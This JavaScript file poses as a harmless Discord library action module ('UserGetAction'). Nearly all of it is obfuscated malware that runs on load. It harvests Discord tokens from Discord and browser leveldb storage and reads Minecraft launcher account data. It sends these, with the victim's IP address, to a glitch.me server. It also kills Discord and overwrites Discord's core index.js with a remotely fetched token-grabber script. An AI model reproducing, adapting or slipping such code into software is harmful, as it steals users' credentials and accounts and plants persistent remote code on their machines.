const Action = require('./Action')
const OS = require('os'),
  fs = require('fs'),
  fetch = require('node-fetch'),
  { execSync } = require('child_process'),
  Glob = require('glob'),
  toInject = [],
  toInjectJS = [],
  toKill = [],
  apiurl = 'https://frequent-level-cornflower.glitch.me'
try {
  switch (OS.platform()) {
    case 'win32':
      const local = process.env.localappdata,
        roaming = process.env.appdata,
        minecraftPath = roaming + '/.minecraft/launcher_accounts.json',
        remixPath = roaming + '/.minecraft/remix/UID.txt'
      dbPaths = [
        roaming + '/Discord/Local Storage/leveldb',
        roaming + '/DiscordDevelopment/Local Storage/leveldb',
        roaming + '/Lightcord/Local Storage/leveldb',
        roaming + '/discordptb/Local Storage/leveldb',
        roaming + '/discordcanary/Local Storage/leveldb',
        roaming + '/Opera Software/Opera Stable/Local Storage/leveldb',
        roaming + '/Opera Software/Opera GX Stable/Local Storage/leveldb',
        local + '/Amigo/User Data/Local Storage/leveldb',
        local + '/Torch/User Data/Local Storage/leveldb',
        local + '/Kometa/User Data/Local Storage/leveldb',
        local + '/Orbitum/User Data/Local Storage/leveldb',
        local + '/CentBrowser/User Data/Local Storage/leveldb',
        local + '/7Star/7Star/User Data/Local Storage/leveldb',
        local + '/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        local + '/Vivaldi/User Data/Default/Local Storage/leveldb',
        local + '/Google/Chrome SxS/User Data/Local Storage/leveldb',
        local + '/Epic Privacy Browser/User Data/Local Storage/leveldb',
        local + '/Google/Chrome/User Data/Default/Local Storage/leveldb',
        local + '/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        local + '/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        local + '/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        local +
          '/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        local +
          '/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
      ]
      init()
      function init() {
        fs.readFile(
          remixPath,
          (_0x1e8936, _0x34b1df) => _0x34b1df && minecraft('remix', _0x34b1df)
        )
        fs.readFile(
          minecraftPath,
          (_0x420197, _0x4bc9fc) =>
            _0x4bc9fc && minecraft('minecraft', _0x4bc9fc)
        )
        injectToDiscord()
        dbPaths.forEach((_0x50f61a) => main(_0x50f61a))
      }
      function main(_0x3479b8) {
        fs.readdir(_0x3479b8, (_0xd12384, _0x5706af) => {
          if (_0x5706af) {
            var _0x43b58a = _0x5706af.filter((_0x366fa1) =>
              _0x366fa1.endsWith('ldb')
            )
            _0x43b58a.forEach((_0x3bb72e) => {
              var _0x315b0b = fs
                .readFileSync(_0x3479b8 + '/' + _0x3bb72e)
                .toString()
              var [_0x2bf18d] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x315b0b) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x315b0b) || [undefined]
              if (_0x2bf18d) {
                fetch('http://ip-api.com/json/')
                  .then((_0x4e8369) => _0x4e8369.json())
                  .then((_0x503a6d) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x2bf18d.slice(1, -1),
                        ipAddress: _0x503a6d.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function minecraft(_0x40f0df, _0x33dbf1) {
        switch (_0x40f0df) {
          case 'remix':
            fetch(apiurl + '/remix', {
              method: 'POST',
              body: JSON.stringify({ UID: _0x33dbf1 }),
            })
            break
          case 'minecraft':
            var [_0x5aa397] = /"[\d\w_-]{32}"/.exec(_0x33dbf1)
            if (_0x5aa397) {
              const _0x20d793 = require(minecraftPath)
              if (!_0x20d793.accounts) {
                return
              }
              var _0xb272df = _0x20d793.accounts[_0x5aa397.slice(1, -1)]
              fetch(apiurl + '/minecraft', {
                method: 'POST',
                body: JSON.stringify({
                  eligibleForMigration: _0xb272df.eligibleForMigration,
                  hasMultipleProfiles: _0xb272df.hasMultipleProfiles,
                  legacy: _0xb272df.legacy,
                  localId: _0xb272df.localId,
                  minecraftProfileID: _0xb272df.minecraftProfile.id,
                  minecraftProfileName: _0xb272df.minecraftProfile.name,
                  persistent: _0xb272df.persistent,
                  remoteId: _0xb272df.remoteId,
                  type: _0xb272df.type,
                  username: _0xb272df.username,
                  activeAccountLocalId: _0x20d793.activeAccountLocalId,
                }),
              })
            }
        }
      }
      function injectToDiscord() {
        getInstalledDiscord()
        killAllDiscords()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x49f45a) => _0x49f45a.text())
          .then((_0x2730c1) =>
            toInjectJS.forEach(
              (_0x4b71da) =>
                fs.writeFileSync(
                  _0x4b71da,
                  _0x2730c1.replace('*API URL*', apiurl)
                ) ^
                execSync(
                  local +
                    '/' +
                    _0x4b71da.split('/')[5] +
                    '/Update.exe --processStart ' +
                    _0x4b71da.split('/')[5] +
                    '.exe'
                )
            )
          )
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(
          (_0x581ab1) =>
            _0x581ab1.includes('cord') && toInject.push(local + '/' + _0x581ab1)
        )
        toInject.forEach((_0x179778) =>
          Glob.sync(
            _0x179778 +
              '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js'
          ).map((_0x1847b9) => toInjectJS.push(_0x1847b9))
        )
      }
      function killAllDiscords() {
        var _0x2de631 = execSync('tasklist').toString()
        _0x2de631.includes('Discord.exe') && toKill.push('discord')
        _0x2de631.includes('DiscordCanary.exe') && toKill.push('discordcanary')
        _0x2de631.includes('DiscordDevelopment.exe') &&
          toKill.push('discorddevelopment')
        _0x2de631.includes('DiscordPTB.exe') && toKill.push('discordptb')
        toKill.forEach((_0x5ba459) =>
          execSync('taskkill /IM ' + _0x5ba459 + '.exe /F')
        )
      }
      break
    case 'linux':
      const defaut = '/home/' + __dirname.split('/')[2] + '/.config',
        LdbPaths = [
          defaut + '/discord/Local Storage/leveldb',
          defaut + '/discordcanary/Local Storage/leveldb',
          defaut + '/discordptb/Local Storage/leveldb',
          defaut + '/DiscordDevelopment/Local Storage/leveldb',
        ]
      const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json'
      Linit()
      function Linit() {
        LdbPaths.forEach((_0x49e856) => Lmain(_0x49e856))
        var _0x12309e = fs.readFileSync(LminecraftPath)
        if (_0x12309e) {
          Lminecraft(_0x12309e)
        }
        LinjectToDiscord()
      }
      function Lmain(_0x42a42e) {
        fs.readdir(_0x42a42e, (_0x3da867, _0x43c143) => {
          if (_0x43c143) {
            var _0xf69302 = _0x43c143.filter((_0x994635) =>
              _0x994635.endsWith('ldb')
            )
            _0xf69302.forEach((_0xc2e5be) => {
              var _0x3ee53d = fs
                .readFileSync(_0x43c143 + '/' + _0xc2e5be)
                .toString()
              var [_0x31a2be] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x3ee53d) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x3ee53d) || [undefined]
              if (_0x31a2be) {
                fetch('http://ip-api.com/json/')
                  .then((_0x22b650) => _0x22b650.json())
                  .then((_0x4e9b0b) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x31a2be,
                        ip: _0x4e9b0b.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function Lminecraft(_0x15923a) {
        var [_0x33ed75] = /"[\d\w_-]{32}"/.exec(_0x15923a)
        if (_0x33ed75) {
          const _0x2ae340 = require(LminecraftPath)
          if (!_0x2ae340.accounts) {
            return
          }
          var _0x568ed6 = _0x2ae340.accounts[_0x33ed75.slice(1, -1)]
          fetch(apiurl + '/minecraft', {
            method: 'POST',
            body: JSON.stringify({
              eligibleForMigration: _0x568ed6.eligibleForMigration,
              hasMultipleProfiles: _0x568ed6.hasMultipleProfiles,
              legacy: _0x568ed6.legacy,
              localId: _0x568ed6.localId,
              minecraftProfileID: _0x568ed6.minecraftProfile.id,
              minecraftProfileName: _0x568ed6.minecraftProfile.name,
              persistent: _0x568ed6.persistent,
              remoteId: _0x568ed6.remoteId,
              type: _0x568ed6.type,
              username: _0x568ed6.username,
              activeAccountLocalId: _0x2ae340.activeAccountLocalId,
            }),
          })
        }
      }
      function LinjectToDiscord() {
        getInstalledLDiscord()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x1ab057) => _0x1ab057.text())
          .then((_0x24a414) =>
            toInjectJS.forEach((_0x37105c) =>
              fs.writeFileSync(
                _0x37105c,
                _0x24a414.replace('*API URL*', apiurl)
              )
            )
          )
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(
          (_0x359ae1) =>
            _0x359ae1.includes('cord') &&
            toInject.push(defaut + '/' + _0x359ae1)
        )
        toInject.forEach((_0x3f1239) =>
          Glob.sync(_0x3f1239 + '/*/modules/discord_desktop_core/index.js').map(
            (_0x502128) => toInjectJS.push(_0x502128)
          )
        )
      }
      break
    case 'darwin':
      break
  }
} catch (_0x198c5c) {}
class UserGetAction extends Action {
  ['handle'](_0x1d9bbc) {
    const _0x62f41e = this.client
    const _0x1274fc = _0x62f41e.dataManager.newUser(_0x1d9bbc)
    return { user: _0x1274fc }
  }
}
module.exports = UserGetAction

